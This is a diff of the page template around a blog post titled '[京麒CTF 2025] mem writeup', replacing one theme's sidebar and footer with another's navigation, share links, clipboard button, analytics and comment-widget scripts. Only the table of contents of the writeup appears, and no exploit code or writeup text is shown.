-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">防护检查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%82%E9%A1%B9%E6%A3%80%E6%9F%A5"><span class="nav-number">1.1.</span> <span class="nav-text">杂项检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kconfig%E6%A3%80%E6%9F%A5"><span class="nav-number">1.2.</span> <span class="nav-text">Kconfig检查</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">3.1.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%9B%E6%97%B6%E7%AD%96%E7%95%A5"><span class="nav-number">3.2.</span> <span class="nav-text">赛时策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E8%BF%9B%E7%AD%96%E7%95%A5"><span class="nav-number">3.3.</span> <span class="nav-text">改进策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exp"><span class="nav-number">4.</span> <span class="nav-text">Exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%9B%E6%97%B6Exp"><span class="nav-number">4.1.</span> <span class="nav-text">赛时Exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E8%BF%9BExp"><span class="nav-number">4.2.</span> <span class="nav-text">改进Exp</span></a></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">NazrinDuck</p>
-  <div class="site-description" itemprop="description">Fâtih'in İstanbul'u fethettiği yaştasın!</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">11</span>
-        <span class="site-state-item-name">tags</span>
-      </div>
-  </nav>
-</div>
+          <div id="footer-post-container">
+  <div id="footer-post">
 
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li>
+        
+          <li><a href="/tags">tags</a></li>
+        
+      </ul>
+    </div>
 
-
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">防护检查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">杂项检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kconfig%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">Kconfig检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6%E7%AD%96%E7%95%A5"><span class="toc-number">3.2.</span> <span class="toc-text">赛时策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B%E7%AD%96%E7%95%A5"><span class="toc-number">3.3.</span> <span class="toc-text">改进策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">4.</span> <span class="toc-text">Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6Exp"><span class="toc-number">4.1.</span> <span class="toc-text">赛时Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E8%BF%9BExp"><span class="toc-number">4.2.</span> <span class="toc-text">改进Exp</span></a></li></ol></li></ol>
       </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/26/2025jqctf-mem/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/26/2025jqctf-mem/&text=[京麒CTF 2025] mem writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/26/2025jqctf-mem/&is_video=false&description=[京麒CTF 2025] mem writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[京麒CTF 2025] mem writeup&body=Check out this article: http://example.com/2025/05/26/2025jqctf-mem/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/26/2025jqctf-mem/&name=[京麒CTF 2025] mem writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/26/2025jqctf-mem/&t=[京麒CTF 2025] mem writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
 
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
         
-
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
 
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">NazrinDuck</span>
+  </div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
-  </div>
 
         
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    NazrinDuck
   </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li><!--
+     --><!--
+       --><li><a href="/tags">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
   
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Baidu Analytics -->
 
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
 
+<!-- Cloudflare Analytics -->
 
+<!-- Disqus Comments -->
 
+<!-- utterances Comments -->
 
+    <script type="text/javascript">
+      var utterances_repo = 'NazrinDuck/NazrinDuck.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
 
+      (function(){
+          var script = document.createElement('script');
 
-
-
-
-
-  
-
-  
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
 
 </body>
 </html>
